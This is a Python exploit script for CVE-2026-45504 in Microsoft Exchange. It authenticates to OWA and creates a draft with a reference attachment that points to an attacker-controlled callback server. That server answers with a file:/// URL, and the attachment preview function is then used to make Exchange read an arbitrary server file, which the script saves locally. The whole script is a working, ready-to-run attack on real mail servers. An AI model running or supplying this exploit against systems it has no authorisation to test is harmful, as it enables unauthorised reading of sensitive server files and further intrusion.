#!/usr/bin/env python3
import argparse
import re
import sys
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests
from requests_ntlm import HttpNtlmAuth

requests.packages.urllib3.disable_warnings()


def parse_args():
    p = argparse.ArgumentParser(description="exchange ssrf via file read")
    p.add_argument("--attacker-ip", required=True, help="attacker ip ssrf callback")
    p.add_argument("--attacker-port", type=int, default=8780, help="attacker port")
    p.add_argument(
        "--creds", required=True, metavar="[DOMAIN\\]USER", help="DOMAIN\\username"
    )
    p.add_argument("--password", required=True, help="Account password")
    p.add_argument("--target-file", default="C:/windows/win.ini", help="target file")
    p.add_argument(
        "--target", default="https://192.168.2.145", help="target https://192.168.2.145"
    )
    args = p.parse_args()
    if "\\" in args.creds:
        args.domain, args.user = args.creds.split("\\", 1)
    else:
        args.domain, args.user = "", args.creds
    return args


ARGS = parse_args()
TARGET = ARGS.target
ATTACKER_IP = ARGS.attacker_ip
ATTACKER_PORT = ARGS.attacker_port
DOMAIN = ARGS.domain
USER = ARGS.user
PASS = ARGS.password
TARGET_FILE = ARGS.target_file

PRINCIPAL = f"{DOMAIN}\\{USER}" if DOMAIN else USER
NTLM = HttpNtlmAuth(PRINCIPAL, PASS)
_current_path = TARGET_FILE


class CallbackHandler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        escaped = _current_path.replace(" ", "%20")
        body = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<root xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices">'
            f"<d:WebApplicationUrl>file:///{escaped}#</d:WebApplicationUrl>"
            "<d:AccessToken>x</d:AccessToken>"
            "<d:AccessTokenTtl>3600</d:AccessTokenTtl>"
            "</root>"
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/xml; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def login():
    s = requests.Session()
    s.verify = False

    r = s.post(
        f"{TARGET}/owa/auth.owa",
        data={
            "destination": f"{TARGET}/owa/",
            "flags": "4",
            "forcedownlevel": "0",
            "username": PRINCIPAL,
            "password": PASS,
            "isUtf8": "1",
        },
        allow_redirects=False,
        timeout=20,
    )

    location = r.headers.get("Location", "")
    if "reason=2" in location or "logon.aspx" in location.lower():
        raise Exception("err: login failed")

    s.get(f"{TARGET}/owa/", allow_redirects=True, timeout=20)

    canary = next((c.value for c in s.cookies if "canary" in c.name.lower()), None)
    if not canary:
        raise Exception("err: login failed")

    return s, canary


def attach(base_url):
    r = requests.post(
        f"{TARGET}/ews/exchange.asmx",
        data=b"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header><t:RequestServerVersion Version="Exchange2016"/></soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:SavedItemFolderId><t:DistinguishedFolderId Id="drafts"/></m:SavedItemFolderId>
      <m:Items><t:Message><t:Subject>lfi</t:Subject><t:Body BodyType="HTML">x</t:Body></t:Message></m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>""",
        headers={"Content-Type": "text/xml; charset=utf-8"},
        auth=NTLM,
        verify=False,
        timeout=20,
    )

    m = re.search(r'Id="([A-Za-z0-9+/=]+)".*?ChangeKey="([A-Za-z0-9+/=]+)"', r.text)
    if not m:
        raise Exception("err: create item")

    item_id, item_ck = m.group(1), m.group(2)

    r2 = requests.post(
        f"{TARGET}/ews/exchange.asmx",
        data=f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header><t:RequestServerVersion Version="Exchange2016"/></soap:Header>
  <soap:Body>
    <m:CreateAttachment>
      <m:ParentItemId Id="{item_id}" ChangeKey="{item_ck}"/>
      <m:Attachments>
        <t:ReferenceAttachment>
          <t:Name>doc.docx</t:Name>
          <t:AttachLongPathName>{base_url}/doc.docx</t:AttachLongPathName>
          <t:ProviderType>OneDrivePro</t:ProviderType>
          <t:ProviderEndpointUrl>{base_url}/</t:ProviderEndpointUrl>
        </t:ReferenceAttachment>
      </m:Attachments>
    </m:CreateAttachment>
  </soap:Body>
</soap:Envelope>""".encode(),
        headers={"Content-Type": "text/xml; charset=utf-8"},
        auth=NTLM,
        verify=False,
        timeout=20,
    )

    m2 = re.search(r'Id="([A-Za-z0-9+/=]+)".*?RootItemId', r2.text)
    if not m2:
        raise Exception("err: create attachment")

    return m2.group(1)


def read_file(session, canary, att_id):
    enc = urllib.parse.quote(att_id, safe="")
    r = session.post(
        f"{TARGET}/owa/service.svc?action=GetAttachmentPreview&id={enc}",
        data="{}",
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "X-OWA-CANARY": canary,
            "Action": "GetAttachmentPreview",
        },
        verify=False,
        timeout=20,
    )
    return r.content


def sanitize_name(name):
    return re.sub(r"[^A-Za-z0-9._-]+", "_", name).strip("_") or "unknown"


def save_content(content):
    parsed = urllib.parse.urlparse(TARGET)
    target_name = parsed.hostname or TARGET
    target_name = sanitize_name(target_name)

    normalized_path = TARGET_FILE.replace("\\", "/").strip("/")
    path_part = sanitize_name(normalized_path) or "output.bin"

    out_name = f"{target_name}_{path_part}"
    with open(out_name, "wb") as f:
        f.write(content)

    return out_name


def main():
    print(r""" _                    _    _
| |                  | |  | |
| |__   __ ___      _| | _| |_ _ __ __ _  ___ ___
| '_ \ / _` \ \ /\ / / |/ / __| '__/ _` |/ __/ _ \
| | | | (_| |\ V  V /|   <| |_| | | (_| | (_|  __/
|_| |_|\__,_| \_/\_/ |_|\_\\__|_|  \__,_|\___\___|
          Batuhan Er @int20z
CVE-2026-45504 Microsoft Exchange File Read""")

    srv = HTTPServer(("0.0.0.0", ATTACKER_PORT), CallbackHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    print(f"[*] Target file : {TARGET_FILE}")
    print(f"[*] User        : {PRINCIPAL}")

    session, canary = login()
    print("[+] OWA login OK")

    att_id = attach(f"http://{ATTACKER_IP}:{ATTACKER_PORT}")
    print(f"[+] Attachment  : {att_id[:40]}...")

    content = read_file(session, canary, att_id)
    srv.shutdown()

    if content:
        out_file = save_content(content)
        print(f"[+] File read OK ({len(content)} bytes)")
        print(f"[+] Saved to    : {out_file}")
    else:
        print("[-] err: empty response")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[-] {e}")
        sys.exit(1)
